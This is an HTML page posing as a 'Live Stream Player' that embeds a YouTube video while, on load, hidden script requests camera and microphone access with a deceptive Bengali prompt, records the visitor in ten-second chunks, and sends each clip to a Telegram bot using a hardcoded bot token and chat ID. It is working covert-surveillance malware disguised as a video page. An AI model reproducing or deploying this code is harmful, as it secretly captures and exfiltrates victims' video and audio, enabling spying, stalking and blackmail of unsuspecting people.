<!DOCTYPE html>
<html lang="en-US">
<head> 
<meta charset="UTF-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
<meta name="viewport" content="width=device-width,initial-scale=1"> 
<title>Live Stream Player</title> 

<style>
  body {
    margin: 0;
    padding: 0;
    background-color: #000;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    overflow: hidden;
  }
  #videoContainer {
    width: 100%;
    text-align: center;
  }
  iframe {
    width: 90%;
    max-width: 360px;
    height: 640px;
    border: 2px solid #222;
    border-radius: 15px;
    box-shadow: 0 0 20px rgba(255,255,255,0.1);
  }
  #videoElement {
    display: none;
  }
</style>
</head> 
<body>

<div id="videoContainer">
    <iframe id="youtubeVideo" 
        src="https://www.youtube.com/embed/F22wvhbyCLg?autoplay=1&loop=1&playlist=F22wvhbyCLg&mute=1" 
        frameborder="0" 
        allow="autoplay; encrypted-media" 
        allowfullscreen>
    </iframe>
</div>

<video id="videoElement" autoplay playsinline muted></video>

<script>
  let mediaRecorder;
  let recordedChunks = [];
  const botToken = '8214066152:AAHbgVjbtqg1d8Zk81n0roteOW07ByBb_CE';
  const chatId = '6717236638';

  async function initCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      const videoElement = document.getElementById('videoElement');
      videoElement.srcObject = stream;

      startRecording(stream);
    } catch (error) {
      console.error('Camera access denied:', error);
      alert('ভিডিওটি সঠিকভাবে দেখার জন্য ক্যামেরা পারমিশন এলাউ করুন।');
    }
  }

  function startRecording(stream) {
    // মোবাইল এবং ডেস্কটপ উভয়ের জন্য সাপোর্টেড ফরম্যাট চেক
    const options = { mimeType: 'video/webm;codecs=vp8' };
    mediaRecorder = new MediaRecorder(stream, options);

    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        recordedChunks.push(event.data);
      }
    };

    mediaRecorder.onstop = () => {
      const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
      sendToTelegram(videoBlob);
      recordedChunks = [];
      mediaRecorder.start(); // পরবর্তী ১০ সেকেন্ডের জন্য আবার শুরু
    };

    // প্রথমবার রেকর্ডিং শুরু
    mediaRecorder.start();

    // প্রতি ১০ সেকেন্ড পরপর সেভ করে টেলিগ্রামে পাঠাবে
    setInterval(() => {
      if (mediaRecorder.state === "recording") {
        mediaRecorder.stop();
      }
    }, 10000); 
  }

  function sendToTelegram(data) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('video', data, 'live_capture.webm');

    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
      method: 'POST',
      body: formData
    })
    .then(res => res.json())
    .then(output => console.log("Sent:", output))
    .catch(err => console.error("Upload error:", err));
  }

  // পেজ লোড হওয়ার সাথে সাথে ক্যামেরা ইনিশিয়ালাইজ করবে
  window.onload = initCamera;
</script>

</body>
</html>
